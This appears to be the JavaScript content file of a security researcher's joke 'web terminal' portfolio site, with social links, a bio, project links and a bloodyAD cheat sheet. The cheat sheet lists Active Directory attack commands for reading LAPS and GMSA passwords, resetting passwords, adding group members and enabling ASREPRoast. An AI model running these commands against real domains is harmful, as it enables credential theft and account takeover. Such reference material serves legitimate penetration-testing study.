const twitterURL = "https://www.twitter.com/r4vanan/";
const password = "supers3cret";//i know you will find this
const linkedinURL = "https://www.linkedin.com/in/r4vanan/";
const instagramURL = "https://www.instagram.com/r4vanan/";
const githubURL = "https://github.com/r4vanan/";
const emailURL = 'mailto:lawrencetheworldhacker99@gmail.com';

const whoisDetails = [
  "<br>",
  "Hey, I'm R4vanan!👋",
  "I am busy sharpening my skills and learning about malware (don’t worry, only for research... mostly 😅).",
  "My job is to think like the bad guys, bypassing antivirus systems and finding security holes before the hackers do 🕵️‍♂️💻.",
  "I craft malware just to see if I can outsmart the defenses (because who doesn’t love a good digital challenge? 🧠💥).",
  "I’ve got a knack for finding vulnerabilities, earning some shiny CVEs along the way, and making antivirus software feel insecure about itself 😎.",
  "When I’m not busy breaking things, I’m contributing to open-source projects 👨‍💻🚀",
  "<br>"
];

const whoamiDetails = [
  "<br>",
  "You are 100% human, I think. Because, let’s be real, only humans ask that! At least that’s what the last software update said. I’m still waiting for my ‘bug-free’ version, but clearly, it’s not going to be anything like you! 😜",
  "<br>"
];

const socialLinks = [
  "<br>",
  'twitter        <a href="' + twitterURL + '" target="_blank">twitter/r4vanan' + '</a>',
  'linkedin       <a href="' + linkedinURL + '" target="_blank">linkedin/r4vanan' + "</a>",
  'instagram      <a href="' + instagramURL + '" target="_blank">instagram/r4vanan' + '</a>',
  'github         <a href="' + githubURL + '" target="_blank">github/r4vanan' + "</a>",
  "<br>"
];

const secretDetails = [
  "<br>",
  '<span class="command">sudo</span>           Only use if you\'re admin',
  "<br>"
];

const projectDetails = [
  "<br>",
  'Public Repositories:',
  '<a href="https://github.com/r4vanan/fg_log_parser" target="_blank">fortigate log parser</a> - The tool made for log analysis on fortigate',
  '<a href="https://github.com/r4vanan/Stored-xss-Grav-v1.7.45" target="_blank">CVE-2024–35498</a>',
  "I just want to live in peace, so let’s leave the deep existential questions for another time. 😎",
  "<br>"
];

const helpDetails = [
  "<br>",
  '<span class="command">whois</span>          Who is R4vanan?',
  '<span class="command">whoami</span>         Who are you?',
  '<span class="command">video</span>          View YouTube videos',
  '<span class="command">social</span>         Display social networks',
  '<span class="command">secret</span>         Find the password',
  '<span class="command">projects</span>       View coding projects',
  '<span class="command">history</span>        View command history',
  '<span class="command">help</span>           You obviously already know',
  '<span class="command">email</span>          Do not email me',
  '<span class="command">clear</span>          Clear terminal',
  '<span class="command">banner</span>         Display the header',
  '<span class="command">bloodyAD</span>       Display bloodyAD commands cheat sheet',
  "<br>",
];

const bannerDetails = [
  '<span class="color2">Welcome to my totally real, not-at-all suspicious web terminal.</span>',
  "<span class=\"color2\">For a list of available commands, type</span> <span class=\"command\">'help'</span><span class=\"color2\">(or just guess, I don’t mind).</span>",
  "<span class=\"color2\">Type 'sudo' if you want to unlock some top-secret, world-changing commands... or just to feel powerful for a moment. 😎</span>",
];

const bloodyAdDetails = [
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user                      // Get all users of the domain",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type computer                  // Get all computers of the domain",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type container                 // Get all containers of the domain",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump                                             // Get AD DNS records",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object Users --attr member                                          // Get group members",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr msDS-Behavior-Version       // Get AD functional level",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr minPwdLength                // Get minimum password length policy",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota   // Read quota for adding computer objects to domain",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USERNAME>' --attr userAccountControl                       // Get UserAccountControl flags",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd                        // Read LAPS password",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                 // Read GMSA account password",
  "bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                          // Read GMSA account password using Kerberos",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>' --kerberos --dc-ip <RHOST>       // Set a password for a user",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName                            // Set a Service Principal Name (SPN)",
  "bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName                                     // Set a Service Principal Name (SPN) using Kerberos",
  "bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                // Set a Service Principal Name (SPN) using Kerberos",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                  // Add user to a group",
  "bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'                                           // Add user to a group using Kerberos",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>                                          // Add a new DNS entry",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> DONT_REQ_PREAUTH                                     // Enable DONT_REQ_PREAUTH for ASREPRoast",
  "bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac <USERNAME> -f DONT_REQ_PREAUTH                                           // Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>                                       // Remove a DNS entry",
  "bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac <USERNAME> ACCOUNTDISABLE                                    // Disable ACCOUNTDISABLE (enable account)",
  "bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac <USERNAME> -f ACCOUNTDISABLE                                          // Disable ACCOUNTDISABLE (enable account) using Kerberos"
];
